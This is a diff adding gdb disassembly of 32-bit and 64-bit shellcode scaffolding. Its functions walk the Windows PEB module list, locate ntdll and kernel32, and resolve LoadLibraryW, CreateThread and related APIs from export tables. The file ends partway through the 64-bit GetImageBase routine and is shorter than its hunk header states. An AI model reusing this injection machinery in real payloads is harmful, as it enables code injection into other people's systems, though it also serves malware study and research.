@@ -1,0 +1,489 @@
+Dump of assembler code for function ShellCode(Package*):
+   0x080488c0 <+0>:	53	push   %ebx
+   0x080488c1 <+1>:	83 ec 04	sub    $0x4,%esp
+   0x080488c4 <+4>:	8b 5c 24 0c	mov    0xc(%esp),%ebx
+   0x080488c8 <+8>:	c7 83 08 0a 00 00 00 00 00 00	movl   $0x0,0xa08(%ebx)
+   0x080488d2 <+18>:	89 1c 24	mov    %ebx,(%esp)
+   0x080488d5 <+21>:	e8 b6 fe ff ff	call   0x8048790 <GetImageBase(Package*)>
+   0x080488da <+26>:	8b 83 0c 0a 00 00	mov    0xa0c(%ebx),%eax
+   0x080488e0 <+32>:	66 81 38 4d 5a	cmpw   $0x5a4d,(%eax)
+   0x080488e5 <+37>:	74 31	je     0x8048918 <ShellCode(Package*)+88>
+   0x080488e7 <+39>:	8b 83 10 0a 00 00	mov    0xa10(%ebx),%eax
+   0x080488ed <+45>:	66 81 38 4d 5a	cmpw   $0x5a4d,(%eax)
+   0x080488f2 <+50>:	74 0c	je     0x8048900 <ShellCode(Package*)+64>
+   0x080488f4 <+52>:	83 c4 04	add    $0x4,%esp
+   0x080488f7 <+55>:	b8 2a 00 00 00	mov    $0x2a,%eax
+   0x080488fc <+60>:	5b	pop    %ebx
+   0x080488fd <+61>:	c3	ret    
+   0x080488fe <+62>:	66 90	xchg   %ax,%ax
+   0x08048900 <+64>:	89 da	mov    %ebx,%edx
+   0x08048902 <+66>:	e8 89 fb ff ff	call   0x8048490 <GetProcAddress(void*, Package*)>
+   0x08048907 <+71>:	83 c4 04	add    $0x4,%esp
+   0x0804890a <+74>:	b8 2a 00 00 00	mov    $0x2a,%eax
+   0x0804890f <+79>:	5b	pop    %ebx
+   0x08048910 <+80>:	c3	ret    
+   0x08048911 <+81>:	8d b4 26 00 00 00 00	lea    0x0(%esi,%eiz,1),%esi
+   0x08048918 <+88>:	89 da	mov    %ebx,%edx
+   0x0804891a <+90>:	e8 71 fb ff ff	call   0x8048490 <GetProcAddress(void*, Package*)>
+   0x0804891f <+95>:	eb c6	jmp    0x80488e7 <ShellCode(Package*)+39>
+
+Dump of assembler code for function GetImageBase(Package*):
+   0x08048790 <+0>:  56 push   %esi
+   0x08048791 <+1>:  53 push   %ebx
+   0x08048792 <+2>:  8b 5c 24 0c mov    0xc(%esp),%ebx
+   0x08048796 <+6>:  8b 83 08 0a 00 00 mov    0xa08(%ebx),%eax
+   0x0804879c <+12>: 8b 40 0c mov    0xc(%eax),%eax
+   0x0804879f <+15>: 8d 70 14 lea    0x14(%eax),%esi
+   0x080487a2 <+18>: 8b 40 14 mov    0x14(%eax),%eax
+   0x080487a5 <+21>: 39 c6 cmp    %eax,%esi
+   0x080487a7 <+23>: 75 22 jne    0x80487cb <GetImageBase(Package*)+59>
+   0x080487a9 <+25>: eb 5d jmp    0x8048808 <GetImageBase(Package*)+120>
+   0x080487ab <+27>: 90 nop
+   0x080487ac <+28>: 8d 74 26 00 lea    0x0(%esi,%eiz,1),%esi
+   0x080487b0 <+32>: 83 bb 10 0a 00 00 00 cmpl   $0x0,0xa10(%ebx)
+   0x080487b7 <+39>: 0f 84 a3 00 00 00 je     0x8048860 <GetImageBase(Package*)+208>
+   0x080487bd <+45>: 81 fa 6b 00 65 00 cmp    $0x65006b,%edx
+   0x080487c3 <+51>: 74 4b je     0x8048810 <GetImageBase(Package*)+128>
+   0x080487c5 <+53>: 8b 00 mov    (%eax),%eax
+   0x080487c7 <+55>: 39 c6 cmp    %eax,%esi
+   0x080487c9 <+57>: 74 3d je     0x8048808 <GetImageBase(Package*)+120>
+   0x080487cb <+59>: 8b 93 0c 0a 00 00 mov    0xa0c(%ebx),%edx
+   0x080487d1 <+65>: 8b 48 28 mov    0x28(%eax),%ecx
+   0x080487d4 <+68>: 85 d2 test   %edx,%edx
+   0x080487d6 <+70>: 8b 11 mov    (%ecx),%edx
+   0x080487d8 <+72>: 74 5e je     0x8048838 <GetImageBase(Package*)+168>
+   0x080487da <+74>: 81 fa 4e 00 54 00 cmp    $0x54004e,%edx
+   0x080487e0 <+80>: 75 ce jne    0x80487b0 <GetImageBase(Package*)+32>
+   0x080487e2 <+82>: 81 79 04 44 00 4c 00 cmpl   $0x4c0044,0x4(%ecx)
+   0x080487e9 <+89>: 75 da jne    0x80487c5 <GetImageBase(Package*)+53>
+   0x080487eb <+91>: 81 79 08 4c 00 2e 00 cmpl   $0x2e004c,0x8(%ecx)
+   0x080487f2 <+98>: 75 d1 jne    0x80487c5 <GetImageBase(Package*)+53>
+   0x080487f4 <+100>:   8b 50 10 mov    0x10(%eax),%edx
+   0x080487f7 <+103>:   8b 00 mov    (%eax),%eax
+   0x080487f9 <+105>:   89 93 0c 0a 00 00 mov    %edx,0xa0c(%ebx)
+   0x080487ff <+111>:   39 c6 cmp    %eax,%esi
+   0x08048801 <+113>:   75 c8 jne    0x80487cb <GetImageBase(Package*)+59>
+   0x08048803 <+115>:   90 nop
+   0x08048804 <+116>:   8d 74 26 00 lea    0x0(%esi,%eiz,1),%esi
+   0x08048808 <+120>:   5b pop    %ebx
+   0x08048809 <+121>:   5e pop    %esi
+   0x0804880a <+122>:   c3 ret    
+   0x0804880b <+123>:   90 nop
+   0x0804880c <+124>:   8d 74 26 00 lea    0x0(%esi,%eiz,1),%esi
+   0x08048810 <+128>:   81 79 04 72 00 6e 00 cmpl   $0x6e0072,0x4(%ecx)
+   0x08048817 <+135>:   75 ac jne    0x80487c5 <GetImageBase(Package*)+53>
+   0x08048819 <+137>:   81 79 08 65 00 6c 00 cmpl   $0x6c0065,0x8(%ecx)
+   0x08048820 <+144>:   75 a3 jne    0x80487c5 <GetImageBase(Package*)+53>
+   0x08048822 <+146>:   81 79 0c 33 00 32 00 cmpl   $0x320033,0xc(%ecx)
+   0x08048829 <+153>:   75 9a jne    0x80487c5 <GetImageBase(Package*)+53>
+   0x0804882b <+155>:   81 79 10 2e 00 64 00 cmpl   $0x64002e,0x10(%ecx)
+   0x08048832 <+162>:   75 91 jne    0x80487c5 <GetImageBase(Package*)+53>
+   0x08048834 <+164>:   eb 6a jmp    0x80488a0 <GetImageBase(Package*)+272>
+   0x08048836 <+166>:   66 90 xchg   %ax,%ax
+   0x08048838 <+168>:   81 fa 6e 00 74 00 cmp    $0x74006e,%edx
+   0x0804883e <+174>:   75 9a jne    0x80487da <GetImageBase(Package*)+74>
+   0x08048840 <+176>:   81 79 04 64 00 6c 00 cmpl   $0x6c0064,0x4(%ecx)
+   0x08048847 <+183>:   0f 85 78 ff ff ff jne    0x80487c5 <GetImageBase(Package*)+53>
+   0x0804884d <+189>:   81 79 08 6c 00 2e 00 cmpl   $0x2e006c,0x8(%ecx)
+   0x08048854 <+196>:   0f 85 6b ff ff ff jne    0x80487c5 <GetImageBase(Package*)+53>
+   0x0804885a <+202>:   eb 98 jmp    0x80487f4 <GetImageBase(Package*)+100>
+   0x0804885c <+204>:   8d 74 26 00 lea    0x0(%esi,%eiz,1),%esi
+   0x08048860 <+208>:   81 fa 4b 00 45 00 cmp    $0x45004b,%edx
+   0x08048866 <+214>:   0f 85 51 ff ff ff jne    0x80487bd <GetImageBase(Package*)+45>
+   0x0804886c <+220>:   81 79 04 52 00 4e 00 cmpl   $0x4e0052,0x4(%ecx)
+   0x08048873 <+227>:   0f 85 4c ff ff ff jne    0x80487c5 <GetImageBase(Package*)+53>
+   0x08048879 <+233>:   81 79 08 45 00 4c 00 cmpl   $0x4c0045,0x8(%ecx)
+   0x08048880 <+240>:   0f 85 3f ff ff ff jne    0x80487c5 <GetImageBase(Package*)+53>
+   0x08048886 <+246>:   81 79 0c 33 00 32 00 cmpl   $0x320033,0xc(%ecx)
+   0x0804888d <+253>:   0f 85 32 ff ff ff jne    0x80487c5 <GetImageBase(Package*)+53>
+   0x08048893 <+259>:   81 79 10 2e 00 44 00 cmpl   $0x44002e,0x10(%ecx)
+   0x0804889a <+266>:   0f 85 25 ff ff ff jne    0x80487c5 <GetImageBase(Package*)+53>
+   0x080488a0 <+272>:   8b 50 10 mov    0x10(%eax),%edx
+   0x080488a3 <+275>:   89 93 10 0a 00 00 mov    %edx,0xa10(%ebx)
+   0x080488a9 <+281>:   e9 17 ff ff ff jmp    0x80487c5 <GetImageBase(Package*)+53>
+
+Dump of assembler code for function GetProcAddress(void*, Package*):
+   0x08048490 <+0>:  8b 48 3c mov    0x3c(%eax),%ecx
+   0x08048493 <+3>:  81 3c 08 50 45 00 00 cmpl   $0x4550,(%eax,%ecx,1)
+   0x0804849a <+10>: 74 04 je     0x80484a0 <GetProcAddress(void*, Package*)+16>
+   0x0804849c <+12>: c3 ret    
+   0x0804849d <+13>: 8d 76 00 lea    0x0(%esi),%esi
+   0x080484a0 <+16>: 55 push   %ebp
+   0x080484a1 <+17>: 57 push   %edi
+   0x080484a2 <+18>: 56 push   %esi
+   0x080484a3 <+19>: 53 push   %ebx
+   0x080484a4 <+20>: 83 ec 0c sub    $0xc,%esp
+   0x080484a7 <+23>: 0f b7 5c 08 04 movzwl 0x4(%eax,%ecx,1),%ebx
+   0x080484ac <+28>: 66 81 fb 64 86 cmp    $0x8664,%bx
+   0x080484b1 <+33>: 0f 85 01 01 00 00 jne    0x80485b8 <GetProcAddress(void*, Package*)+296>
+   0x080484b7 <+39>: 66 81 fb 4c 01 cmp    $0x14c,%bx
+   0x080484bc <+44>: be 60 00 00 00 mov    $0x60,%esi
+   0x080484c1 <+49>: bb 70 00 00 00 mov    $0x70,%ebx
+   0x080484c6 <+54>: 0f 45 f3 cmovne %ebx,%esi
+   0x080484c9 <+57>: 01 c1 add    %eax,%ecx
+   0x080484cb <+59>: 8b 7c 0e 18 mov    0x18(%esi,%ecx,1),%edi
+   0x080484cf <+63>: 01 c7 add    %eax,%edi
+   0x080484d1 <+65>: 8b 77 24 mov    0x24(%edi),%esi
+   0x080484d4 <+68>: 8b 6f 20 mov    0x20(%edi),%ebp
+   0x080484d7 <+71>: 01 c6 add    %eax,%esi
+   0x080484d9 <+73>: 89 34 24 mov    %esi,(%esp)
+   0x080484dc <+76>: 8b 77 1c mov    0x1c(%edi),%esi
+   0x080484df <+79>: 01 c5 add    %eax,%ebp
+   0x080484e1 <+81>: 8b 7f 18 mov    0x18(%edi),%edi
+   0x080484e4 <+84>: 01 c6 add    %eax,%esi
+   0x080484e6 <+86>: 85 ff test   %edi,%edi
+   0x080484e8 <+88>: 89 7c 24 04 mov    %edi,0x4(%esp)
+   0x080484ec <+92>: 0f 84 d6 00 00 00 je     0x80485c8 <GetProcAddress(void*, Package*)+312>
+   0x080484f2 <+98>: 31 c9 xor    %ecx,%ecx
+   0x080484f4 <+100>:   89 6c 24 08 mov    %ebp,0x8(%esp)
+   0x080484f8 <+104>:   eb 63 jmp    0x804855d <GetProcAddress(void*, Package*)+205>
+   0x080484fa <+106>:   8d b6 00 00 00 00 lea    0x0(%esi),%esi
+   0x08048500 <+112>:   8b aa 18 0a 00 00 mov    0xa18(%edx),%ebp
+   0x08048506 <+118>:   85 ed test   %ebp,%ebp
+   0x08048508 <+120>:   0f 84 c2 00 00 00 je     0x80485d0 <GetProcAddress(void*, Package*)+320>
+   0x0804850e <+126>:   8b aa 1c 0a 00 00 mov    0xa1c(%edx),%ebp
+   0x08048514 <+132>:   85 ed test   %ebp,%ebp
+   0x08048516 <+134>:   0f 84 ec 00 00 00 je     0x8048608 <GetProcAddress(void*, Package*)+376>
+   0x0804851c <+140>:   8b aa 20 0a 00 00 mov    0xa20(%edx),%ebp
+   0x08048522 <+146>:   85 ed test   %ebp,%ebp
+   0x08048524 <+148>:   0f 84 26 01 00 00 je     0x8048650 <GetProcAddress(void*, Package*)+448>
+   0x0804852a <+154>:   8b aa 24 0a 00 00 mov    0xa24(%edx),%ebp
+   0x08048530 <+160>:   85 ed test   %ebp,%ebp
+   0x08048532 <+162>:   0f 84 58 01 00 00 je     0x8048690 <GetProcAddress(void*, Package*)+512>
+   0x08048538 <+168>:   8b aa 28 0a 00 00 mov    0xa28(%edx),%ebp
+   0x0804853e <+174>:   85 ed test   %ebp,%ebp
+   0x08048540 <+176>:   0f 84 d2 01 00 00 je     0x8048718 <GetProcAddress(void*, Package*)+648>
+   0x08048546 <+182>:   8b aa 2c 0a 00 00 mov    0xa2c(%edx),%ebp
+   0x0804854c <+188>:   85 ed test   %ebp,%ebp
+   0x0804854e <+190>:   0f 84 8c 01 00 00 je     0x80486e0 <GetProcAddress(void*, Package*)+592>
+   0x08048554 <+196>:   83 c1 01 add    $0x1,%ecx
+   0x08048557 <+199>:   3b 4c 24 04 cmp    0x4(%esp),%ecx
+   0x0804855b <+203>:   74 6b je     0x80485c8 <GetProcAddress(void*, Package*)+312>
+   0x0804855d <+205>:   8b 7c 24 08 mov    0x8(%esp),%edi
+   0x08048561 <+209>:   89 c3 mov    %eax,%ebx
+   0x08048563 <+211>:   03 1c 8f add    (%edi,%ecx,4),%ebx
+   0x08048566 <+214>:   8b 3c 24 mov    (%esp),%edi
+   0x08048569 <+217>:   0f b7 3c 4f movzwl (%edi,%ecx,2),%edi
+   0x0804856d <+221>:   8b 2c be mov    (%esi,%edi,4),%ebp
+   0x08048570 <+224>:   01 c5 add    %eax,%ebp
+   0x08048572 <+226>:   89 ef mov    %ebp,%edi
+   0x08048574 <+228>:   8b aa 14 0a 00 00 mov    0xa14(%edx),%ebp
+   0x0804857a <+234>:   85 ed test   %ebp,%ebp
+   0x0804857c <+236>:   75 82 jne    0x8048500 <GetProcAddress(void*, Package*)+112>
+   0x0804857e <+238>:   81 3b 4c 6f 61 64 cmpl   $0x64616f4c,(%ebx)
+   0x08048584 <+244>:   0f 85 76 ff ff ff jne    0x8048500 <GetProcAddress(void*, Package*)+112>
+   0x0804858a <+250>:   81 7b 04 4c 69 62 72 cmpl   $0x7262694c,0x4(%ebx)
+   0x08048591 <+257>:   0f 85 69 ff ff ff jne    0x8048500 <GetProcAddress(void*, Package*)+112>
+   0x08048597 <+263>:   81 7b 08 61 72 79 57 cmpl   $0x57797261,0x8(%ebx)
+   0x0804859e <+270>:   0f 85 5c ff ff ff jne    0x8048500 <GetProcAddress(void*, Package*)+112>
+   0x080485a4 <+276>:   80 7b 0c 00 cmpb   $0x0,0xc(%ebx)
+   0x080485a8 <+280>:   0f 85 52 ff ff ff jne    0x8048500 <GetProcAddress(void*, Package*)+112>
+   0x080485ae <+286>:   89 ba 14 0a 00 00 mov    %edi,0xa14(%edx)
+   0x080485b4 <+292>:   eb 9e jmp    0x8048554 <GetProcAddress(void*, Package*)+196>
+   0x080485b6 <+294>:   66 90 xchg   %ax,%ax
+   0x080485b8 <+296>:   66 81 fb 4c 01 cmp    $0x14c,%bx
+   0x080485bd <+301>:   0f 84 f4 fe ff ff je     0x80484b7 <GetProcAddress(void*, Package*)+39>
+   0x080485c3 <+307>:   90 nop
+   0x080485c4 <+308>:   8d 74 26 00 lea    0x0(%esi,%eiz,1),%esi
+   0x080485c8 <+312>:   83 c4 0c add    $0xc,%esp
+   0x080485cb <+315>:   5b pop    %ebx
+   0x080485cc <+316>:   5e pop    %esi
+   0x080485cd <+317>:   5f pop    %edi
+   0x080485ce <+318>:   5d pop    %ebp
+   0x080485cf <+319>:   c3 ret    
+   0x080485d0 <+320>:   81 3b 46 72 65 65 cmpl   $0x65657246,(%ebx)
+   0x080485d6 <+326>:   0f 85 32 ff ff ff jne    0x804850e <GetProcAddress(void*, Package*)+126>
+   0x080485dc <+332>:   81 7b 04 4c 69 62 72 cmpl   $0x7262694c,0x4(%ebx)
+   0x080485e3 <+339>:   0f 85 25 ff ff ff jne    0x804850e <GetProcAddress(void*, Package*)+126>
+   0x080485e9 <+345>:   81 7b 08 61 72 79 00 cmpl   $0x797261,0x8(%ebx)
+   0x080485f0 <+352>:   0f 85 18 ff ff ff jne    0x804850e <GetProcAddress(void*, Package*)+126>
+   0x080485f6 <+358>:   89 ba 18 0a 00 00 mov    %edi,0xa18(%edx)
+   0x080485fc <+364>:   e9 53 ff ff ff jmp    0x8048554 <GetProcAddress(void*, Package*)+196>
+   0x08048601 <+369>:   8d b4 26 00 00 00 00 lea    0x0(%esi,%eiz,1),%esi
+   0x08048608 <+376>:   81 3b 47 65 74 50 cmpl   $0x50746547,(%ebx)
+   0x0804860e <+382>:   0f 85 08 ff ff ff jne    0x804851c <GetProcAddress(void*, Package*)+140>
+   0x08048614 <+388>:   81 7b 04 72 6f 63 41 cmpl   $0x41636f72,0x4(%ebx)
+   0x0804861b <+395>:   0f 85 fb fe ff ff jne    0x804851c <GetProcAddress(void*, Package*)+140>
+   0x08048621 <+401>:   81 7b 08 64 64 72 65 cmpl   $0x65726464,0x8(%ebx)
+   0x08048628 <+408>:   0f 85 ee fe ff ff jne    0x804851c <GetProcAddress(void*, Package*)+140>
+   0x0804862e <+414>:   8b 6b 0c mov    0xc(%ebx),%ebp
+   0x08048631 <+417>:   81 e5 ff ff ff 00 and    $0xffffff,%ebp
+   0x08048637 <+423>:   81 fd 73 73 00 00 cmp    $0x7373,%ebp
+   0x0804863d <+429>:   0f 85 d9 fe ff ff jne    0x804851c <GetProcAddress(void*, Package*)+140>
+   0x08048643 <+435>:   89 ba 1c 0a 00 00 mov    %edi,0xa1c(%edx)
+   0x08048649 <+441>:   e9 06 ff ff ff jmp    0x8048554 <GetProcAddress(void*, Package*)+196>
+   0x0804864e <+446>:   66 90 xchg   %ax,%ax
+   0x08048650 <+448>:   81 3b 43 72 65 61 cmpl   $0x61657243,(%ebx)
+   0x08048656 <+454>:   0f 85 ce fe ff ff jne    0x804852a <GetProcAddress(void*, Package*)+154>
+   0x0804865c <+460>:   81 7b 04 74 65 54 68 cmpl   $0x68546574,0x4(%ebx)
+   0x08048663 <+467>:   0f 85 c1 fe ff ff jne    0x804852a <GetProcAddress(void*, Package*)+154>
+   0x08048669 <+473>:   81 7b 08 72 65 61 64 cmpl   $0x64616572,0x8(%ebx)
+   0x08048670 <+480>:   0f 85 b4 fe ff ff jne    0x804852a <GetProcAddress(void*, Package*)+154>
+   0x08048676 <+486>:   80 7b 0c 00 cmpb   $0x0,0xc(%ebx)
+   0x0804867a <+490>:   0f 85 aa fe ff ff jne    0x804852a <GetProcAddress(void*, Package*)+154>
+   0x08048680 <+496>:   89 ba 20 0a 00 00 mov    %edi,0xa20(%edx)
+   0x08048686 <+502>:   e9 c9 fe ff ff jmp    0x8048554 <GetProcAddress(void*, Package*)+196>
+   0x0804868b <+507>:   90 nop
+   0x0804868c <+508>:   8d 74 26 00 lea    0x0(%esi,%eiz,1),%esi
+   0x08048690 <+512>:   81 3b 52 74 6c 45 cmpl   $0x456c7452,(%ebx)
+   0x08048696 <+518>:   0f 85 9c fe ff ff jne    0x8048538 <GetProcAddress(void*, Package*)+168>
+   0x0804869c <+524>:   81 7b 04 78 69 74 55 cmpl   $0x55746978,0x4(%ebx)
+   0x080486a3 <+531>:   0f 85 8f fe ff ff jne    0x8048538 <GetProcAddress(void*, Package*)+168>
+   0x080486a9 <+537>:   81 7b 08 73 65 72 54 cmpl   $0x54726573,0x8(%ebx)
+   0x080486b0 <+544>:   0f 85 82 fe ff ff jne    0x8048538 <GetProcAddress(void*, Package*)+168>
+   0x080486b6 <+550>:   81 7b 0c 68 72 65 61 cmpl   $0x61657268,0xc(%ebx)
+   0x080486bd <+557>:   0f 85 75 fe ff ff jne    0x8048538 <GetProcAddress(void*, Package*)+168>
+   0x080486c3 <+563>:   66 83 7b 10 64 cmpw   $0x64,0x10(%ebx)
+   0x080486c8 <+568>:   0f 85 6a fe ff ff jne    0x8048538 <GetProcAddress(void*, Package*)+168>
+   0x080486ce <+574>:   89 ba 24 0a 00 00 mov    %edi,0xa24(%edx)
+   0x080486d4 <+580>:   e9 7b fe ff ff jmp    0x8048554 <GetProcAddress(void*, Package*)+196>
+   0x080486d9 <+585>:   8d b4 26 00 00 00 00 lea    0x0(%esi,%eiz,1),%esi
+   0x080486e0 <+592>:   81 3b 43 6c 6f 73 cmpl   $0x736f6c43,(%ebx)
+   0x080486e6 <+598>:   0f 85 68 fe ff ff jne    0x8048554 <GetProcAddress(void*, Package*)+196>
+   0x080486ec <+604>:   81 7b 04 65 48 61 6e cmpl   $0x6e614865,0x4(%ebx)
+   0x080486f3 <+611>:   0f 85 5b fe ff ff jne    0x8048554 <GetProcAddress(void*, Package*)+196>
+   0x080486f9 <+617>:   81 7b 08 64 6c 65 00 cmpl   $0x656c64,0x8(%ebx)
+   0x08048700 <+624>:   0f 85 4e fe ff ff jne    0x8048554 <GetProcAddress(void*, Package*)+196>
+   0x08048706 <+630>:   89 ba 2c 0a 00 00 mov    %edi,0xa2c(%edx)
+   0x0804870c <+636>:   e9 43 fe ff ff jmp    0x8048554 <GetProcAddress(void*, Package*)+196>
+   0x08048711 <+641>:   8d b4 26 00 00 00 00 lea    0x0(%esi,%eiz,1),%esi
+   0x08048718 <+648>:   81 3b 57 61 69 74 cmpl   $0x74696157,(%ebx)
+   0x0804871e <+654>:   0f 85 22 fe ff ff jne    0x8048546 <GetProcAddress(void*, Package*)+182>
+   0x08048724 <+660>:   81 7b 04 46 6f 72 53 cmpl   $0x53726f46,0x4(%ebx)
+   0x0804872b <+667>:   0f 85 15 fe ff ff jne    0x8048546 <GetProcAddress(void*, Package*)+182>
+   0x08048731 <+673>:   81 7b 08 69 6e 67 6c cmpl   $0x6c676e69,0x8(%ebx)
+   0x08048738 <+680>:   0f 85 08 fe ff ff jne    0x8048546 <GetProcAddress(void*, Package*)+182>
+   0x0804873e <+686>:   81 7b 0c 65 4f 62 6a cmpl   $0x6a624f65,0xc(%ebx)
+   0x08048745 <+693>:   0f 85 fb fd ff ff jne    0x8048546 <GetProcAddress(void*, Package*)+182>
+   0x0804874b <+699>:   81 7b 10 65 63 74 00 cmpl   $0x746365,0x10(%ebx)
+   0x08048752 <+706>:   0f 85 ee fd ff ff jne    0x8048546 <GetProcAddress(void*, Package*)+182>
+   0x08048758 <+712>:   89 ba 28 0a 00 00 mov    %edi,0xa28(%edx)
+   0x0804875e <+718>:   e9 f1 fd ff ff jmp    0x8048554 <GetProcAddress(void*, Package*)+196>
+
+Dump of assembler code for function ShellCode(Package*):
+   0x00000000004009f0 <+0>:   53 push   %rbx
+   0x00000000004009f1 <+1>:   48 89 fb mov    %rdi,%rbx
+   0x00000000004009f4 <+4>:   48 c7 87 08 0a 00 00 00 00 00 00 movq   $0x0,0xa08(%rdi)
+   0x00000000004009ff <+15>:  e8 ac fe ff ff callq  0x4008b0 <GetImageBase(Package*)>
+   0x0000000000400a04 <+20>:  48 8b bb 10 0a 00 00 mov    0xa10(%rbx),%rdi
+   0x0000000000400a0b <+27>:  66 81 3f 4d 5a cmpw   $0x5a4d,(%rdi)
+   0x0000000000400a10 <+32>:  74 2e je     0x400a40 <ShellCode(Package*)+80>
+   0x0000000000400a12 <+34>:  48 8b bb 18 0a 00 00 mov    0xa18(%rbx),%rdi
+   0x0000000000400a19 <+41>:  66 81 3f 4d 5a cmpw   $0x5a4d,(%rdi)
+   0x0000000000400a1e <+46>:  74 10 je     0x400a30 <ShellCode(Package*)+64>
+   0x0000000000400a20 <+48>:  b8 2a 00 00 00 mov    $0x2a,%eax
+   0x0000000000400a25 <+53>:  5b pop    %rbx
+   0x0000000000400a26 <+54>:  c3 retq   
+   0x0000000000400a27 <+55>:  66 0f 1f 84 00 00 00 00 00 nopw   0x0(%rax,%rax,1)
+   0x0000000000400a30 <+64>:  48 89 de mov    %rbx,%rsi
+   0x0000000000400a33 <+67>:  e8 78 fb ff ff callq  0x4005b0 <GetProcAddress(void*, Package*)>
+   0x0000000000400a38 <+72>:  b8 2a 00 00 00 mov    $0x2a,%eax
+   0x0000000000400a3d <+77>:  5b pop    %rbx
+   0x0000000000400a3e <+78>:  c3 retq   
+   0x0000000000400a3f <+79>:  90 nop
+   0x0000000000400a40 <+80>:  48 89 de mov    %rbx,%rsi
+   0x0000000000400a43 <+83>:  e8 68 fb ff ff callq  0x4005b0 <GetProcAddress(void*, Package*)>
+   0x0000000000400a48 <+88>:  eb c8 jmp    0x400a12 <ShellCode(Package*)+34>
+
+Dump of assembler code for function GetImageBase(Package*):
+   0x00000000004008b0 <+0>:   48 8b 87 08 0a 00 00 mov    0xa08(%rdi),%rax
+   0x00000000004008b7 <+7>:   48 8b 40 18 mov    0x18(%rax),%rax
+   0x00000000004008bb <+11>:  48 8d 70 20 lea    0x20(%rax),%rsi
+   0x00000000004008bf <+15>:  48 8b 40 20 mov    0x20(%rax),%rax
+   0x00000000004008c3 <+19>:  48 39 c6 cmp    %rax,%rsi
+   0x00000000004008c6 <+22>:  75 26 jne    0x4008ee <GetImageBase(Package*)+62>
+   0x00000000004008c8 <+24>:  eb 66 jmp    0x400930 <GetImageBase(Package*)+128>
+   0x00000000004008ca <+26>:  66 0f 1f 44 00 00 nopw   0x0(%rax,%rax,1)
+   0x00000000004008d0 <+32>:  48 83 bf 18 0a 00 00 00 cmpq   $0x0,0xa18(%rdi)
+   0x00000000004008d8 <+40>:  0f 84 aa 00 00 00 je     0x400988 <GetImageBase(Package*)+216>
+   0x00000000004008de <+46>:  81 fa 6b 00 65 00 cmp    $0x65006b,%edx
+   0x00000000004008e4 <+52>:  74 52 je     0x400938 <GetImageBase(Package*)+136>
+   0x00000000004008e6 <+54>:  48 8b 00 mov    (%rax),%rax
+   0x00000000004008e9 <+57>:  48 39 c6 cmp    %rax,%rsi
+   0x00000000004008ec <+60>:  74 42 je     0x400930 <GetImageBase(Package*)+128>
+   0x00000000004008ee <+62>:  48 83 bf 10 0a 00 00 00 cmpq   $0x0,0xa10(%rdi)
+   0x00000000004008f6 <+70>:  48 8b 48 50 mov    0x50(%rax),%rcx
+   0x00000000004008fa <+74>:  8b 11 mov    (%rcx),%edx
+   0x00000000004008fc <+76>:  74 62 je     0x400960 <GetImageBase(Package*)+176>
+   0x00000000004008fe <+78>:  81 fa 4e 00 54 00 cmp    $0x54004e,%edx
+   0x0000000000400904 <+84>:  75 ca jne    0x4008d0 <GetImageBase(Package*)+32>
+   0x0000000000400906 <+86>:  81 79 04 44 00 4c 00 cmpl   $0x4c0044,0x4(%rcx)
+   0x000000000040090d <+93>:  75 d7 jne    0x4008e6 <GetImageBase(Package*)+54>
+   0x000000000040090f <+95>:  81 79 08 4c 00 2e 00 cmpl   $0x2e004c,0x8(%rcx)
+   0x0000000000400916 <+102>: 75 ce jne    0x4008e6 <GetImageBase(Package*)+54>
+   0x0000000000400918 <+104>: 48 8b 50 20 mov    0x20(%rax),%rdx
+   0x000000000040091c <+108>: 48 8b 00 mov    (%rax),%rax
+   0x000000000040091f <+111>: 48 39 c6 cmp    %rax,%rsi
+   0x0000000000400922 <+114>: 48 89 97 10 0a 00 00 mov    %rdx,0xa10(%rdi)
+   0x0000000000400929 <+121>: 75 c3 jne    0x4008ee <GetImageBase(Package*)+62>
+   0x000000000040092b <+123>: 0f 1f 44 00 00 nopl   0x0(%rax,%rax,1)
+   0x0000000000400930 <+128>: f3 c3 repz retq 
+   0x0000000000400932 <+130>: 66 0f 1f 44 00 00 nopw   0x0(%rax,%rax,1)
+   0x0000000000400938 <+136>: 81 79 04 72 00 6e 00 cmpl   $0x6e0072,0x4(%rcx)
+   0x000000000040093f <+143>: 75 a5 jne    0x4008e6 <GetImageBase(Package*)+54>
+   0x0000000000400941 <+145>: 81 79 08 65 00 6c 00 cmpl   $0x6c0065,0x8(%rcx)
+   0x0000000000400948 <+152>: 75 9c jne    0x4008e6 <GetImageBase(Package*)+54>
+   0x000000000040094a <+154>: 81 79 0c 33 00 32 00 cmpl   $0x320033,0xc(%rcx)
+   0x0000000000400951 <+161>: 75 93 jne    0x4008e6 <GetImageBase(Package*)+54>
+   0x0000000000400953 <+163>: 81 79 10 2e 00 64 00 cmpl   $0x64002e,0x10(%rcx)
+   0x000000000040095a <+170>: 75 8a jne    0x4008e6 <GetImageBase(Package*)+54>
+   0x000000000040095c <+172>: eb 6a jmp    0x4009c8 <GetImageBase(Package*)+280>
+   0x000000000040095e <+174>: 66 90 xchg   %ax,%ax
+   0x0000000000400960 <+176>: 81 fa 6e 00 74 00 cmp    $0x74006e,%edx
+   0x0000000000400966 <+182>: 75 96 jne    0x4008fe <GetImageBase(Package*)+78>
+   0x0000000000400968 <+184>: 81 79 04 64 00 6c 00 cmpl   $0x6c0064,0x4(%rcx)
+   0x000000000040096f <+191>: 0f 85 71 ff ff ff jne    0x4008e6 <GetImageBase(Package*)+54>
+   0x0000000000400975 <+197>: 81 79 08 6c 00 2e 00 cmpl   $0x2e006c,0x8(%rcx)
+   0x000000000040097c <+204>: 0f 85 64 ff ff ff jne    0x4008e6 <GetImageBase(Package*)+54>
+   0x0000000000400982 <+210>: eb 94 jmp    0x400918 <GetImageBase(Package*)+104>
+   0x0000000000400984 <+212>: 0f 1f 40 00 nopl   0x0(%rax)
+   0x0000000000400988 <+216>: 81 fa 4b 00 45 00 cmp    $0x45004b,%edx
+   0x000000000040098e <+222>: 0f 85 4a ff ff ff jne    0x4008de <GetImageBase(Package*)+46>
+   0x0000000000400994 <+228>: 81 79 04 52 00 4e 00 cmpl   $0x4e0052,0x4(%rcx)
+   0x000000000040099b <+235>: 0f 85 45 ff ff ff jne    0x4008e6 <GetImageBase(Package*)+54>
+   0x00000000004009a1 <+241>: 81 79 08 45 00 4c 00 cmpl   $0x4c0045,0x8(%rcx)
+   0x00000000004009a8 <+248>: 0f 85 38 ff ff ff jne    0x4008e6 <GetImageBase(Package*)+54>
+   0x00000000004009ae <+254>: 81 79 0c 33 00 32 00 cmpl   $0x320033,0xc(%rcx)
+   0x00000000004009b5 <+261>: 0f 85 2b ff ff ff jne    0x4008e6 <GetImageBase(Package*)+54>
